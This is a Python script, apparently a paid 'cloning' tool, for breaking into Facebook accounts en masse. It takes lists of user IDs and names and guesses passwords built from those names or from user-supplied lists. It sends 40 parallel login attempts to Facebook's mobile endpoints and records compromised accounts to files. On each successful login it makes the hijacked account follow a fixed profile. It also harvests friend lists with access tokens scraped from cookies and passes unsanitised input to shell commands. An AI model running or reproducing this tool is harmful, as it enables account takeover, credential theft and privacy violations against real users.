#!/usr/bin/python3
import os
import sys
import re
import time
import random
import json
import string
import requests
import bs4
from concurrent.futures import ThreadPoolExecutor as ThreadPool
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
# from rich.panel import Panel
from urllib.parse import quote

import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests
import os
import re
import bs4
import platform
import sys
import json
import time
import random
import datetime
import subprocess
import threading
import itertools
import base64
import uuid
import zlib
from concurrent.futures import ThreadPoolExecutor as faisaals
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June',
         'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m'
M = '\033[1;31m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;97m'
U = '\x1b[1;97m'
O = '\x1b[1;97m'
N = '\x1b[0m'    #
my_color = [
    P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data, data2 = {}, {}
aman, cp, salah = 0, 0, 0
ubahP, fuck, pwBaru = [], [], []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June",
             "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = """   

'\x1b[1;91m╭━━━╮╱╱╱╱╱╱╱╱╱╭╮╱╭━╮╭━╮╱╱╱╱╱╱╱╭╮
'\x1b[1;92m┃╭━━╯╱╱╱╱╱╱╱╱╱┃┃╱┃┃╰╯┃┃╱╱╱╱╱╱╱┃┃
'\x1b[1;93m┃╰━━┳━━┳┳━━┳━━┫┃╱┃╭╮╭╮┣━━┳━╮╭━╯┃
'\x1b[1;94m┃╭━━┫╭╮┣┫━━┫╭╮┃┃╱┃┃┃┃┃┃╭╮┃╭╮┫╭╮┃
'\x1b[1;95m┃┃╱╱┃╭╮┃┣━━┃╭╮┃╰╮┃┃┃┃┃┃╭╮┃┃┃┃╰╯┃
'\x1b[1;96m╰╯╱╱╰╯╰┻┻━━┻╯╰┻━╯╰╯╰╯╰┻╯╰┻╯╰┻━━╯
\033[1;97m-----------------------------------------------
\033[1;96m➣ \033[1;93mPROGRAMER   \033[1;96m: \033[1;93mFaisal Mand
\033[1;96m➣ \033[1;93mFACEBOOK    \033[1;96m: \033[1;93mFaisal Mand
\033[1;96m➣ \033[1;93mWHATSAPP    \033[1;96m: \033[1;93m03148498294
\033[1;96m➣ \033[1;93mTeam Group  \033[1;92m: \033[1;93mFaisal Mand 
\033[1;97m-----------------------------------------------"""


def hasil(OK, cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mOK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mCP.txt' %
              (H, P, str(len(cp))))
        input("\x1b[1;97mPress enter to back  ")
        faisalmand()


def faisalmand():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print('\033[1;93m [01] \033[1;97mStart Cloning')
    print(' \033[1;94m[02] \033[1;97mCreate File ')
    print(' \033[1;93m[03] \033[1;97mSeprate Idz ')
    print(' \033[1;95m[04] \033[1;97mDouble Idz Cut From File ')
    print(' \033[1;96m[05] \033[1;97mRemove Expire Token')
    print('\033[1;93m [00] \033[1;97mExit ')
    print('\033[1;97m-----------------------------------------------')
    _ffaisal___ = input('\033[1;93m[•] \033[1;97mChoose : ')
    if _ffaisal___ in ('1', '01'):
        os.system('clear')
        __xxx__().faissalx(id)
    if _ffaisal___ in ('02', '2'):
        os.system('clear')
        publik()
    if _ffaisal___ in ('3', '03'):
        os.system('clear')
        print(logo)
        sep()
    if _ffaisal___ in ('4', '04'):
        os.system('clear')
        dupcutter()
    if _ffaisal___ in ('5', '05'):
        time.sleep(2)
        os.system('clear')
        print(logo)
        print(' Removing Token .')
        time.sleep(1)
        os.system('clear')
        print(logo)
        print(' Removing Token ..')
        time.sleep(1)
        os.system('clear')
        print(logo)
        print(' Removing Token ...')
        time.sleep(2)
        os.system('clear')
        print(logo)
        print('\033[1;91mToken Removed\033[0m')
        time.sleep(3)
        os.system('rm -rf access_token.txt')
        version()
    if _ffaisal___ in ('0', '00'):
        os.system('clear')
        exit('BYE')


class __xxx__:
    def __init__(self):
        self.id = []

    def faissalx(self, id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;93m[××] \033[1;97mFile Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes', 'Yes', 'Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.faissalx(id)

    def __metode__(self, user, __chi__, cebok):
        global ok, cp, loop
        sys.stdout.write(
            f"\r\x1b[1;97m[FaiSyl] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session = requests.Session()
                header = {
                    "Host": cebok,
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/30.0.1599.12 Mobile/11A465 Safari/8536.25 (3B92C18B-D9DE-4CB7-A02A-22FD2AF17C8F",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt": "1",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "0?",
                    "sec-fetch-dest": "document",
                    "referer": "https://p.facebook.com/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9"
                }
                r = session.get(
                    f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid": user,
                    "flow": "login_no_pin",
                    "pass": pw,
                    "next": "https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host": cebok,
                    "cache-control": "max-age=0",
                    "upgrade-insecure-requests": "1",
                    "origin": "https://"+cebok,
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/30.0.1599.12 Mobile/11A465 Safari/8536.25 (3B92C18B-D9DE-4CB7-A02A-22FD2AF17C8F",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with": "XMLHttpRequest",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "0?",
                    "sec-fetch-dest": "document",
                    "referer": "https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding": "gzip, deflate br",
                    "accept-language": "en-US,en;q=0.9"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0",
                                  data=das, headers=header1, allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    coki = ";".join(
                        [key+"="+value for key, value in session.cookies.get_dict().items()])
                    print(f"\r{H}[FaiSy-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user, pw)
                    ok.append(wrt)
                    open('ok.txt', 'a').write('%s\n' % wrt)
                    self.follow(session, coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(
                            f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s[FaiSy-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user, pw)
                        cp.append(wrt)
                        open('cp.txt', 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day = ''
                        year = ''
                    except:
                        pass
                    print('\r%s[FaiSy-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user, pw)
                    cp.append(wrt)
                    open('cp.txt', 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop += 1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get(
            'https://free.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://free.facebook.com' + str(get)),
                    cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;93m[1] \033[1;97mCrack Auto Pass \033[1;92m{4-PASS}')
        print(
            '\033[1;93m[2] \033[1;97mCrack Digit Passwords   \033[1;92m{3-PASS}')
        print(
            '\033[1;93m[3] \033[1;97mCrack Name + Digit Pass \033[1;92m{2-PASS}')
        print(
            '\033[1;93m[4] \033[1;97mCrack With first last and fullname Pass \033[1;92m{VIP Fast}')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\033[1;93m[•] \033[1;97mChoose : \033[1;92m')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started \033[1;97m')
            print(47*"-")
            with faisaals(max_workers=40) as faisaal:
                for zsb in self.id:  # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]
                        if jbg == '1':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "m.facebook.com")
                        else:
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            pp1 = input('\033[1;97mPass 01 : \033[1;92m')
            pp2 = input('\033[1;97mPass 02 : \033[1;92m')
            pp3 = input('\033[1;97mPass 03 : \033[1;92m')
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with faisaals(max_workers=40) as faisaal:
                for zsb in self.id:  # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [pp1, pp2, pp3]
                        else:
                            pwx = [pp1, pp2, pp3]
                        if jbg == '1':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "m.facebook.com")
                        else:
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            pxp1 = input('\033[1;97mfirst + : \033[1;92m')
            pxp2 = input('\033[1;97mfirst + : \033[1;92m')
            pxp3 = input('\033[1;97mfirst + : \033[1;92m')
            ptp4 = input('\033[1;92mlast + : \033[1;92m')
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with faisaals(max_workers=40) as faisaal:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+pxp1, xz[0]+pxp2,
                                   xz[0]+pxp3, xz[1]+ptp4]
                        else:
                            pwx = [xz[0]+pxp1, xz[0]+pxp2,
                                   xz[0]+pxp3, xz[1]+ptp4]
                        if jbg == '1':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "m.facebook.com")
                        else:
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('4', '04'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with faisaals(max_workers=40) as faisaal:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0].lower() + ' ' + xz[1].lower()]
                        else:
                            pwx = [name, xz[0].lower() + ' ' + xz[1].lower()]
                        if jbg == '1':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "m.facebook.com")
                        else:
                            faisaal.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        else:
            print('\n Select Valid One')
            self.__pler__()


class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')
###


def sep():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    print('\033[1;32m Example /sdcard/abc.txt')
    file_name = input('\033[1;33m Input file name: ')
    print('\033[1;32m Example /sdcard/abc1.txt')
    new_save = input('\033[1;33m Save new file as: ')
    y = 0
    for k in range(limit):
        y += 1
        print('\033[1;32m EXAMPLE [100079],[10000] etc\033[0m')
        links = input(' \033[1;33mPut links %s:\033[1;32m ' % (y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(54*"\033[1;33m_")
    print("")
    print('\033[1;33m Links grabbed successfully')
    print(' Total grabbed links:\033[1;32m   ' +
          str(len(open(new_save).read().splitlines())))
    print('\033[1;33m New file saved as: \033[1;32m  '+new_save)
    print(54*"\033[1;33m_")
    print("")
    input('\033[1;32m Press enter to back ')
    faisalmand()
####


def dupcutter():
    os.system('clear')
    print(logo)
    print("[+] Example : /sdcard/your_file_name.txt  \n\n")
    Error = input('[+] File Path   : ')
    Error1 = input('[+] New File Save As : ')
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print("")
    print("")
    print(54*"\033[1;33m_")
    print("")
    print("[+] Removing Successful  From File " + Error)
    print("[+] New File Save " + Error1)
    print(54*"\033[1;33m_")
    time.sleep(2)
####


def _f_a_md__eck():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    try:
        httpCaht = requests.get('https://cutt.ly/rHG1EnC').text
        if id in httpCaht:
            print("\033[1;92mYour Token is successfully Approved")
            msg = str(os.geteuid())
            time.sleep(0.3)
            faisalmand()
            pass
        else:
            print("\x1b[37;1mYour Token :\033[1;92m "+id)
            print('\033[1;97m-----------------------------------------------')
            print("\x1b[1;97mThis is Paid tool > 350 for 30 days")
            print("\x1b[1;97mCopy Token and Press Enter")
            os.system('xdg-open https://wa.me/+923148498294')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()


def publik():
    global file_dump
    try:
        try:
            token = open('login/token.txt', 'r').read()
            cookie = {'cookie': open('login/cookie.txt', 'r').read()}
        except:
            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n' % (M, P, M, P, M, P))
            time.sleep(3)
            login()
        print(logo)
        print('       %s[%s•%s] %sExample : 10008027084332|100807801156|1000808764' % (
            J, P, J, P))
        tid = input('       %s[%s•%s] %sID Target : %s' %
                    (J, P, J, P, J)).split('|')
        file_dump = 'dump/%s.txt' % (tid[0])
        try:
            os.remove(file_dump)
        except:
            pass
        for id in tid:
            try:
                url = (
                    "https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s" % (id, token))
                with requests.Session() as xyz:
                    jso = json.loads(xyz.get(url, cookies=cookie).text)
                    for d in jso["friends"]["data"]:
                        try:
                            open(file_dump, 'a+').write('%s|%s\n' %
                                                        (d['id'], d['name']))
                        except:
                            continue
            except Exception as e:
                kecuali(e)
        jum = open(file_dump, 'r').read().splitlines()
        print('       %s[%s•%s] %sDump %s%s %sID' %
              (J, P, J, P, J, str(len(jum)), P))
        print('       %s[%s•%s] %sFile : %s%s %s' %
              (J, P, J, P, J, file_dump, P))
    except Exception as e:
        kecuali(e)


def login():
    mkdir_data_login()
    print(logo)
    print('\n%s[%s•%s] %sInput Cookies %s!' % (M, P, M, P, M))
    cookie = str(input('%s[%s•%s] %sCookies %s: %s' % (J, P, J, P, J, P)))
    try:
        token = clotox(cookie)
        coki = {'cookie': cookie}
        open('login/cookie.txt', 'w').write(cookie)
        open('login/token.txt', 'w').write(token)
        faisalmand()
    except requests.exceptions.ConnectionError:
        print('\n   %s[%s•%s] %sNo Internet %s!%s\n' % (M, P, M, P, M, P))
        exit()
    except (KeyError, IOError, AttributeError):
        print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n' % (M, P, M, P, M, P))
        exit()


def mkdir_data_login():
    # Make Directory Login Data
    try:
        os.mkdir("login")
    except:
        pass
    # Make Directory Dump
    try:
        os.mkdir("dump")
    except:
        pass
    # Delete Cookies
    try:
        os.remove('login/cookie.txt')
    except:
        pass
    # Delete Token
    try:
        os.remove('login/token.txt')
    except:
        pass


def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations', headers={
            "user-agent": ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests": "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type": "text/html; charset=utf-8"}, cookies={"cookie": cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))


url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
###

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m"  # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m"  # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m"  # Putih
J = "\x1b[38;5;208m"  # Jingga
A = "\x1b[38;5;248m"  # Abu-Abu


Z2 = "[#000000]"  # Hitam
M2 = "[#FF0000]"  # Merah
H2 = "[#00FF00]"  # Hijau
K2 = "[#FFFF00]"  # Kuning
B2 = "[#00C8FF]"  # Biru
U2 = "[#AF00FF]"  # Ungu
N2 = "[#FF00FF]"  # Pink
O2 = "[#00FFFF]"  # Biru Muda
P2 = "[#FFFFFF]"  # Putih
J2 = "[#FF8F00]"  # Jingga
A2 = "[#AAAAAA]"  # Abu-Abu

if __name__ == '__main__':
    faisalmand()
